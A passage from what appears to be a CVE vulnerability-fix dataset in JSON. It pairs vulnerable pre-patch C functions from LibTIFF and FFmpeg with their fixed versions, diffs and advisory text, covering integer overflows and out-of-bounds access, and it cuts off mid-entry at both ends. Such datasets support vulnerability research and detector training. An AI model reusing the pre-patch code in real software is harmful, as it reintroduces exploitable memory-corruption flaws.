\n\t\t\tt2p->tiff_datasize);\n\t\tif(read==-1){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\ttile, \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t} else {\n\n\t\tif(t2p->pdf_sample == T2P_SAMPLE_PLANAR_SEPARATE_TO_CONTIG){\n\t\t\tseptilesize=TIFFTileSize(input);\n\t\t\tseptilecount=TIFFNumberOfTiles(input);\n\t\t\t/* tilesize=septilesize*t2p->tiff_samplesperpixel; */\n\t\t\ttilecount=septilecount/t2p->tiff_samplesperpixel;\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(samplebuffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebufferoffset=0;\n\t\t\tfor(i=0;i<t2p->tiff_samplesperpixel;i++){\n\t\t\t\tread = \n\t\t\t\t\tTIFFReadEncodedTile(input, \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\t(tdata_t) &(samplebuffer[samplebufferoffset]), \n\t\t\t\t\t\tseptilesize);\n\t\t\t\tif(read==-1){\n\t\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t\t\t_TIFFfree(samplebuffer);\n\t\t\t\t\t\t_TIFFfree(buffer);\n\t\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\t\treturn(0);\n\t\t\t\t}\n\t\t\t\tsamplebufferoffset+=read;\n\t\t\t}\n\t\t\tt2p_sample_planar_separate_to_contig(\n\t\t\t\tt2p,\n\t\t\t\t&(buffer[bufferoffset]),\n\t\t\t\tsamplebuffer, \n\t\t\t\tsamplebufferoffset); \n\t\t\tbufferoffset+=samplebufferoffset;\n\t\t\t_TIFFfree(samplebuffer);\n\t\t}\n\n\t\tif(buffer==NULL){\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tread = TIFFReadEncodedTile(\n\t\t\t\tinput, \n\t\t\t\ttile, \n\t\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\t\tt2p->tiff_datasize);\n\t\t\tif(read==-1){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\ttile, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t_TIFFfree(buffer);\n\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgba_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBAA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgbaa_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_YCBCR_TO_RGB){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"No support for YCbCr to RGB in tile for %s\", \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_LAB_SIGNED_TO_UNSIGNED){\n\t\t\tt2p->tiff_datasize=t2p_sample_lab_signed_to_unsigned(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\t}\n\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) != 0){\n\t\tt2p_tile_collapse_left(\n\t\t\tbuffer, \n\t\t\tTIFFTileRowSize(input),\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth,\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t}\n\n\n\tt2p_disable(output);\n\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, t2p->tiff_photometric);\n\tTIFFSetField(output, TIFFTAG_BITSPERSAMPLE, t2p->tiff_bitspersample);\n\tTIFFSetField(output, TIFFTAG_SAMPLESPERPIXEL, t2p->tiff_samplesperpixel);\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth);\n\t}\n\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t}\n\tTIFFSetField(output, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);\n\tTIFFSetField(output, TIFFTAG_FILLORDER, FILLORDER_MSB2LSB);\n\n\tswitch(t2p->pdf_compression){\n\tcase T2P_COMPRESS_NONE:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_NONE);\n\t\tbreak;\n#ifdef CCITT_SUPPORT\n\tcase T2P_COMPRESS_G4:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4);\n\t\tbreak;\n#endif\n#ifdef JPEG_SUPPORT\n\tcase T2P_COMPRESS_JPEG:\n\t\tif (t2p->tiff_photometric==PHOTOMETRIC_YCBCR) {\n\t\t\tuint16 hor = 0, ver = 0;\n\t\t\tif (TIFFGetField(input, TIFFTAG_YCBCRSUBSAMPLING, &hor, &ver)!=0) {\n\t\t\t\tif (hor != 0 && ver != 0) {\n\t\t\t\t\tTIFFSetField(output, TIFFTAG_YCBCRSUBSAMPLING, hor, ver);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(TIFFGetField(input, TIFFTAG_REFERENCEBLACKWHITE, &xfloatp)!=0){\n\t\t\t\tTIFFSetField(output, TIFFTAG_REFERENCEBLACKWHITE, xfloatp);\n\t\t\t}\n\t\t}\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_JPEG);\n\t\tTIFFSetField(output, TIFFTAG_JPEGTABLESMODE, 0); /* JPEGTABLESMODE_NONE */\n\t\tif(t2p->pdf_colorspace & (T2P_CS_RGB | T2P_CS_LAB)){\n\t\t\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_YCBCR);\n\t\t\tif(t2p->tiff_photometric != PHOTOMETRIC_YCBCR){\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RGB);\n\t\t\t} else {\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RAW);\n\t\t\t}\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_GRAY){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_CMYK){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_JPEGQUALITY, \n\t\t\t\tt2p->pdf_defaultcompressionquality);\n\t\t}\n\t\tbreak;\n#endif\n#ifdef ZIP_SUPPORT\n\tcase T2P_COMPRESS_ZIP:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_DEFLATE);\n\t\tif(t2p->pdf_defaultcompressionquality%100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_PREDICTOR, \n\t\t\t\tt2p->pdf_defaultcompressionquality % 100);\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality/100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_ZIPQUALITY, \n\t\t\t\t(t2p->pdf_defaultcompressionquality / 100));\n\t\t}\n\t\tbreak;\n#endif\n\tdefault:\n\t\tbreak;\n\t}\n\n\tt2p_enable(output);\n\tt2p->outputwritten = 0;\n\tbufferoffset = TIFFWriteEncodedStrip(output, (tstrip_t) 0, buffer,\n\t\t\t\t\t     TIFFStripSize(output)); \n\tif (buffer != NULL) {\n\t\t_TIFFfree(buffer);\n\t\tbuffer = NULL;\n\t}\n\tif (bufferoffset == -1) {\n\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t  \"Error writing encoded tile to output PDF %s\", \n\t\t\t  TIFFFileName(output));\n\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\treturn(0);\n\t}\n\t\n\twritten = t2p->outputwritten;\n\t\n\treturn(written);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -135,7 +135,7 @@\n \t\t\t\treturn(0);\n \t\t\t}\n \t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n-\t\t\t\tif (count >= 4) {\n+\t\t\t\tif (count > 4) {\n                                         int retTIFFReadRawTile;\n                     /* Ignore EOI marker of JpegTables */\n \t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t\tif (count >= 4) {"
            ],
            "added_lines": [
                "\t\t\t\tif (count > 4) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2022-3970",
        "func_name": "libtiff/TIFFReadRGBATileExt",
        "description": "A vulnerability was found in LibTIFF. It has been classified as critical. This affects the function TIFFReadRGBATileExt of the file libtiff/tif_getimage.c. The manipulation leads to integer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The name of the patch is 227500897dfb07fb7d27f7aa570050e62617e3be. It is recommended to apply a patch to fix this issue. The identifier VDB-213549 was assigned to this vulnerability.",
        "git_url": "https://gitlab.com/libtiff/libtiff/-/commit/227500897dfb07fb7d27f7aa570050e62617e3be",
        "commit_title": "TIFFReadRGBATileExt(): fix (unsigned) integer overflow on strips/tiles > 2 GB",
        "commit_text": " Fixes https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=53137 ",
        "func_before": "int\nTIFFReadRGBATileExt(TIFF* tif, uint32_t col, uint32_t row, uint32_t * raster, int stop_on_error )\n{\n    char \temsg[1024] = \"\";\n    TIFFRGBAImage img;\n    int \tok;\n    uint32_t\ttile_xsize, tile_ysize;\n    uint32_t\tread_xsize, read_ysize;\n    uint32_t\ti_row;\n\n    /*\n     * Verify that our request is legal - on a tile file, and on a\n     * tile boundary.\n     */\n    \n    if( !TIFFIsTiled( tif ) )\n    {\n\t\tTIFFErrorExt(tif->tif_clientdata, TIFFFileName(tif),\n\t\t\t\t  \"Can't use TIFFReadRGBATile() with striped file.\");\n\t\treturn (0);\n    }\n    \n    TIFFGetFieldDefaulted(tif, TIFFTAG_TILEWIDTH, &tile_xsize);\n    TIFFGetFieldDefaulted(tif, TIFFTAG_TILELENGTH, &tile_ysize);\n    if( (col % tile_xsize) != 0 || (row % tile_ysize) != 0 )\n    {\n\t\tTIFFErrorExt(tif->tif_clientdata, TIFFFileName(tif),\n                  \"Row/col passed to TIFFReadRGBATile() must be top\"\n                  \"left corner of a tile.\");\n\treturn (0);\n    }\n\n    /*\n     * Setup the RGBA reader.\n     */\n    \n    if (!TIFFRGBAImageOK(tif, emsg) \n\t|| !TIFFRGBAImageBegin(&img, tif, stop_on_error, emsg)) {\n\t    TIFFErrorExt(tif->tif_clientdata, TIFFFileName(tif), \"%s\", emsg);\n\t    return( 0 );\n    }\n\n    /*\n     * The TIFFRGBAImageGet() function doesn't allow us to get off the\n     * edge of the image, even to fill an otherwise valid tile.  So we\n     * figure out how much we can read, and fix up the tile buffer to\n     * a full tile configuration afterwards.\n     */\n\n    if( row + tile_ysize > img.height )\n        read_ysize = img.height - row;\n    else\n        read_ysize = tile_ysize;\n    \n    if( col + tile_xsize > img.width )\n        read_xsize = img.width - col;\n    else\n        read_xsize = tile_xsize;\n\n    /*\n     * Read the chunk of imagery.\n     */\n    \n    img.row_offset = row;\n    img.col_offset = col;\n\n    ok = TIFFRGBAImageGet(&img, raster, read_xsize, read_ysize );\n        \n    TIFFRGBAImageEnd(&img);\n\n    /*\n     * If our read was incomplete we will need to fix up the tile by\n     * shifting the data around as if a full tile of data is being returned.\n     *\n     * This is all the more complicated because the image is organized in\n     * bottom to top format. \n     */\n\n    if( read_xsize == tile_xsize && read_ysize == tile_ysize )\n        return( ok );\n\n    for( i_row = 0; i_row < read_ysize; i_row++ ) {\n        memmove( raster + (tile_ysize - i_row - 1) * tile_xsize,\n                 raster + (read_ysize - i_row - 1) * read_xsize,\n                 read_xsize * sizeof(uint32_t) );\n        _TIFFmemset( raster + (tile_ysize - i_row - 1) * tile_xsize+read_xsize,\n                     0, sizeof(uint32_t) * (tile_xsize - read_xsize) );\n    }\n\n    for( i_row = read_ysize; i_row < tile_ysize; i_row++ ) {\n        _TIFFmemset( raster + (tile_ysize - i_row - 1) * tile_xsize,\n                     0, sizeof(uint32_t) * tile_xsize );\n    }\n\n    return (ok);\n}",
        "func": "int\nTIFFReadRGBATileExt(TIFF* tif, uint32_t col, uint32_t row, uint32_t * raster, int stop_on_error )\n{\n    char \temsg[1024] = \"\";\n    TIFFRGBAImage img;\n    int \tok;\n    uint32_t\ttile_xsize, tile_ysize;\n    uint32_t\tread_xsize, read_ysize;\n    uint32_t\ti_row;\n\n    /*\n     * Verify that our request is legal - on a tile file, and on a\n     * tile boundary.\n     */\n    \n    if( !TIFFIsTiled( tif ) )\n    {\n\t\tTIFFErrorExt(tif->tif_clientdata, TIFFFileName(tif),\n\t\t\t\t  \"Can't use TIFFReadRGBATile() with striped file.\");\n\t\treturn (0);\n    }\n    \n    TIFFGetFieldDefaulted(tif, TIFFTAG_TILEWIDTH, &tile_xsize);\n    TIFFGetFieldDefaulted(tif, TIFFTAG_TILELENGTH, &tile_ysize);\n    if( (col % tile_xsize) != 0 || (row % tile_ysize) != 0 )\n    {\n\t\tTIFFErrorExt(tif->tif_clientdata, TIFFFileName(tif),\n                  \"Row/col passed to TIFFReadRGBATile() must be top\"\n                  \"left corner of a tile.\");\n\treturn (0);\n    }\n\n    /*\n     * Setup the RGBA reader.\n     */\n    \n    if (!TIFFRGBAImageOK(tif, emsg) \n\t|| !TIFFRGBAImageBegin(&img, tif, stop_on_error, emsg)) {\n\t    TIFFErrorExt(tif->tif_clientdata, TIFFFileName(tif), \"%s\", emsg);\n\t    return( 0 );\n    }\n\n    /*\n     * The TIFFRGBAImageGet() function doesn't allow us to get off the\n     * edge of the image, even to fill an otherwise valid tile.  So we\n     * figure out how much we can read, and fix up the tile buffer to\n     * a full tile configuration afterwards.\n     */\n\n    if( row + tile_ysize > img.height )\n        read_ysize = img.height - row;\n    else\n        read_ysize = tile_ysize;\n    \n    if( col + tile_xsize > img.width )\n        read_xsize = img.width - col;\n    else\n        read_xsize = tile_xsize;\n\n    /*\n     * Read the chunk of imagery.\n     */\n    \n    img.row_offset = row;\n    img.col_offset = col;\n\n    ok = TIFFRGBAImageGet(&img, raster, read_xsize, read_ysize );\n        \n    TIFFRGBAImageEnd(&img);\n\n    /*\n     * If our read was incomplete we will need to fix up the tile by\n     * shifting the data around as if a full tile of data is being returned.\n     *\n     * This is all the more complicated because the image is organized in\n     * bottom to top format. \n     */\n\n    if( read_xsize == tile_xsize && read_ysize == tile_ysize )\n        return( ok );\n\n    for( i_row = 0; i_row < read_ysize; i_row++ ) {\n        memmove( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize,\n                 raster + (size_t)(read_ysize - i_row - 1) * read_xsize,\n                 read_xsize * sizeof(uint32_t) );\n        _TIFFmemset( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize+read_xsize,\n                     0, sizeof(uint32_t) * (tile_xsize - read_xsize) );\n    }\n\n    for( i_row = read_ysize; i_row < tile_ysize; i_row++ ) {\n        _TIFFmemset( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize,\n                     0, sizeof(uint32_t) * tile_xsize );\n    }\n\n    return (ok);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -80,15 +80,15 @@\n         return( ok );\n \n     for( i_row = 0; i_row < read_ysize; i_row++ ) {\n-        memmove( raster + (tile_ysize - i_row - 1) * tile_xsize,\n-                 raster + (read_ysize - i_row - 1) * read_xsize,\n+        memmove( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize,\n+                 raster + (size_t)(read_ysize - i_row - 1) * read_xsize,\n                  read_xsize * sizeof(uint32_t) );\n-        _TIFFmemset( raster + (tile_ysize - i_row - 1) * tile_xsize+read_xsize,\n+        _TIFFmemset( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize+read_xsize,\n                      0, sizeof(uint32_t) * (tile_xsize - read_xsize) );\n     }\n \n     for( i_row = read_ysize; i_row < tile_ysize; i_row++ ) {\n-        _TIFFmemset( raster + (tile_ysize - i_row - 1) * tile_xsize,\n+        _TIFFmemset( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize,\n                      0, sizeof(uint32_t) * tile_xsize );\n     }\n ",
        "diff_line_info": {
            "deleted_lines": [
                "        memmove( raster + (tile_ysize - i_row - 1) * tile_xsize,",
                "                 raster + (read_ysize - i_row - 1) * read_xsize,",
                "        _TIFFmemset( raster + (tile_ysize - i_row - 1) * tile_xsize+read_xsize,",
                "        _TIFFmemset( raster + (tile_ysize - i_row - 1) * tile_xsize,"
            ],
            "added_lines": [
                "        memmove( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize,",
                "                 raster + (size_t)(read_ysize - i_row - 1) * read_xsize,",
                "        _TIFFmemset( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize+read_xsize,",
                "        _TIFFmemset( raster + (size_t)(tile_ysize - i_row - 1) * tile_xsize,"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-125013",
        "func_name": "ffmpeg/msrle_decode_frame",
        "description": "A vulnerability was found in FFmpeg 2.0 and classified as problematic. This issue affects the function msrle_decode_frame of the file libavcodec/msrle.c. The manipulation leads to memory corruption. The attack may be initiated remotely. It is recommended to apply a patch to fix this issue.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=c919e1ca2ecfc47d796382973ba0e48b8f6f92a2",
        "commit_title": "",
        "commit_text": "avcodec/msrle: use av_image_get_linesize() to calculate the linesize  Fixes out of array access ",
        "func_before": "static int msrle_decode_frame(AVCodecContext *avctx,\n                              void *data, int *got_frame,\n                              AVPacket *avpkt)\n{\n    const uint8_t *buf = avpkt->data;\n    int buf_size = avpkt->size;\n    MsrleContext *s = avctx->priv_data;\n    int istride = FFALIGN(avctx->width*avctx->bits_per_coded_sample, 32) / 8;\n    int ret;\n\n    s->buf = buf;\n    s->size = buf_size;\n\n    if ((ret = ff_reget_buffer(avctx, s->frame)) < 0)\n        return ret;\n\n    if (avctx->bits_per_coded_sample > 1 && avctx->bits_per_coded_sample <= 8) {\n        const uint8_t *pal = av_packet_get_side_data(avpkt, AV_PKT_DATA_PALETTE, NULL);\n\n        if (pal) {\n            s->frame->palette_has_changed = 1;\n            memcpy(s->pal, pal, AVPALETTE_SIZE);\n        }\n        /* make the palette available */\n        memcpy(s->frame->data[1], s->pal, AVPALETTE_SIZE);\n    }\n\n    /* FIXME how to correctly detect RLE ??? */\n    if (avctx->height * istride == avpkt->size) { /* assume uncompressed */\n        int linesize = (avctx->width * avctx->bits_per_coded_sample + 7) / 8;\n        uint8_t *ptr = s->frame->data[0];\n        uint8_t *buf = avpkt->data + (avctx->height-1)*istride;\n        int i, j;\n\n        for (i = 0; i < avctx->height; i++) {\n            if (avctx->bits_per_coded_sample == 4) {\n                for (j = 0; j < avctx->width - 1; j += 2) {\n                    ptr[j+0] = buf[j>>1] >> 4;\n                    ptr[j+1] = buf[j>>1] & 0xF;\n                }\n                if (avctx->width & 1)\n                    ptr[j+0] = buf[j>>1] >> 4;\n            } else {\n                memcpy(ptr, buf, linesize);\n            }\n            buf -= istride;\n            ptr += s->frame->linesize[0];\n        }\n    } else {\n        bytestream2_init(&s->gb, buf, buf_size);\n        ff_msrle_decode(avctx, (AVPicture*)s->frame, avctx->bits_per_coded_sample, &s->gb);\n    }\n\n    if ((ret = av_frame_ref(data, s->frame)) < 0)\n        return ret;\n\n    *got_frame      = 1;\n\n    /* report that the buffer was completely consumed */\n    return buf_size;\n}",
        "func": "static int msrle_decode_frame(AVCodecContext *avctx,\n                              void *data, int *got_frame,\n                              AVPacket *avpkt)\n{\n    const uint8_t *buf = avpkt->data;\n    int buf_size = avpkt->size;\n    MsrleContext *s = avctx->priv_data;\n    int istride = FFALIGN(avctx->width*avctx->bits_per_coded_sample, 32) / 8;\n    int ret;\n\n    s->buf = buf;\n    s->size = buf_size;\n\n    if ((ret = ff_reget_buffer(avctx, s->frame)) < 0)\n        return ret;\n\n    if (avctx->bits_per_coded_sample > 1 && avctx->bits_per_coded_sample <= 8) {\n        const uint8_t *pal = av_packet_get_side_data(avpkt, AV_PKT_DATA_PALETTE, NULL);\n\n        if (pal) {\n            s->frame->palette_has_changed = 1;\n            memcpy(s->pal, pal, AVPALETTE_SIZE);\n        }\n        /* make the palette available */\n        memcpy(s->frame->data[1], s->pal, AVPALETTE_SIZE);\n    }\n\n    /* FIXME how to correctly detect RLE ??? */\n    if (avctx->height * istride == avpkt->size) { /* assume uncompressed */\n        int linesize = av_image_get_linesize(avctx->pix_fmt, avctx->width, 0);\n        uint8_t *ptr = s->frame->data[0];\n        uint8_t *buf = avpkt->data + (avctx->height-1)*istride;\n        int i, j;\n\n        for (i = 0; i < avctx->height; i++) {\n            if (avctx->bits_per_coded_sample == 4) {\n                for (j = 0; j < avctx->width - 1; j += 2) {\n                    ptr[j+0] = buf[j>>1] >> 4;\n                    ptr[j+1] = buf[j>>1] & 0xF;\n                }\n                if (avctx->width & 1)\n                    ptr[j+0] = buf[j>>1] >> 4;\n            } else {\n                memcpy(ptr, buf, linesize);\n            }\n            buf -= istride;\n            ptr += s->frame->linesize[0];\n        }\n    } else {\n        bytestream2_init(&s->gb, buf, buf_size);\n        ff_msrle_decode(avctx, (AVPicture*)s->frame, avctx->bits_per_coded_sample, &s->gb);\n    }\n\n    if ((ret = av_frame_ref(data, s->frame)) < 0)\n        return ret;\n\n    *got_frame      = 1;\n\n    /* report that the buffer was completely consumed */\n    return buf_size;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -27,7 +27,7 @@\n \n     /* FIXME how to correctly detect RLE ??? */\n     if (avctx->height * istride == avpkt->size) { /* assume uncompressed */\n-        int linesize = (avctx->width * avctx->bits_per_coded_sample + 7) / 8;\n+        int linesize = av_image_get_linesize(avctx->pix_fmt, avctx->width, 0);\n         uint8_t *ptr = s->frame->data[0];\n         uint8_t *buf = avpkt->data + (avctx->height-1)*istride;\n         int i, j;",
        "diff_line_info": {
            "deleted_lines": [
                "        int linesize = (avctx->width * avctx->bits_per_coded_sample + 7) / 8;"
            ],
            "added_lines": [
                "        int linesize = av_image_get_linesize(avctx->pix_fmt, avctx->width, 0);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-6819",
        "func_name": "ffmpeg/ff_mjpeg_decode_frame",
        "description": "Multiple integer underflows in the ff_mjpeg_decode_frame function in libavcodec/mjpegdec.c in FFmpeg before 2.7.2 allow remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted MJPEG data.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=84afc6b70d24fc0bf686e43138c96cf60a9445fe",
        "commit_title": "",
        "commit_text": "avcodec/mjpegdec: Fix small picture upscale  Fixes out of array access   ",
        "func_before": "int ff_mjpeg_decode_frame(AVCodecContext *avctx, void *data, int *got_frame,\n                          AVPacket *avpkt)\n{\n    AVFrame     *frame = data;\n    const uint8_t *buf = avpkt->data;\n    int buf_size       = avpkt->size;\n    MJpegDecodeContext *s = avctx->priv_data;\n    const uint8_t *buf_end, *buf_ptr;\n    const uint8_t *unescaped_buf_ptr;\n    int hshift, vshift;\n    int unescaped_buf_size;\n    int start_code;\n    int i, index;\n    int ret = 0;\n    int is16bit;\n\n    av_dict_free(&s->exif_metadata);\n    av_freep(&s->stereo3d);\n    s->adobe_transform = -1;\n\n    buf_ptr = buf;\n    buf_end = buf + buf_size;\n    while (buf_ptr < buf_end) {\n        /* find start next marker */\n        start_code = ff_mjpeg_find_marker(s, &buf_ptr, buf_end,\n                                          &unescaped_buf_ptr,\n                                          &unescaped_buf_size);\n        /* EOF */\n        if (start_code < 0) {\n            break;\n        } else if (unescaped_buf_size > INT_MAX / 8) {\n            av_log(avctx, AV_LOG_ERROR,\n                   \"MJPEG packet 0x%x too big (%d/%d), corrupt data?\\n\",\n                   start_code, unescaped_buf_size, buf_size);\n            return AVERROR_INVALIDDATA;\n        }\n        av_log(avctx, AV_LOG_DEBUG, \"marker=%x avail_size_in_buf=%\"PTRDIFF_SPECIFIER\"\\n\",\n               start_code, buf_end - buf_ptr);\n\n        ret = init_get_bits8(&s->gb, unescaped_buf_ptr, unescaped_buf_size);\n\n        if (ret < 0) {\n            av_log(avctx, AV_LOG_ERROR, \"invalid buffer\\n\");\n            goto fail;\n        }\n\n        s->start_code = start_code;\n        if (s->avctx->debug & FF_DEBUG_STARTCODE)\n            av_log(avctx, AV_LOG_DEBUG, \"startcode: %X\\n\", start_code);\n\n        /* process markers */\n        if (start_code >= 0xd0 && start_code <= 0xd7)\n            av_log(avctx, AV_LOG_DEBUG,\n                   \"restart marker: %d\\n\", start_code & 0x0f);\n            /* APP fields */\n        else if (start_code >= APP0 && start_code <= APP15)\n            mjpeg_decode_app(s);\n            /* Comment */\n        else if (start_code == COM)\n            mjpeg_decode_com(s);\n\n        ret = -1;\n\n        if (!CONFIG_JPEGLS_DECODER &&\n            (start_code == SOF48 || start_code == LSE)) {\n            av_log(avctx, AV_LOG_ERROR, \"JPEG-LS support not enabled.\\n\");\n            return AVERROR(ENOSYS);\n        }\n\n        switch (start_code) {\n        case SOI:\n            s->restart_interval = 0;\n            s->restart_count    = 0;\n            /* nothing to do on SOI */\n            break;\n        case DQT:\n            ff_mjpeg_decode_dqt(s);\n            break;\n        case DHT:\n            if ((ret = ff_mjpeg_decode_dht(s)) < 0) {\n                av_log(avctx, AV_LOG_ERROR, \"huffman table decode error\\n\");\n                goto fail;\n            }\n            break;\n        case SOF0:\n        case SOF1:\n            s->lossless    = 0;\n            s->ls          = 0;\n            s->progressive = 0;\n            if ((ret = ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case SOF2:\n            s->lossless    = 0;\n            s->ls          = 0;\n            s->progressive = 1;\n            if ((ret = 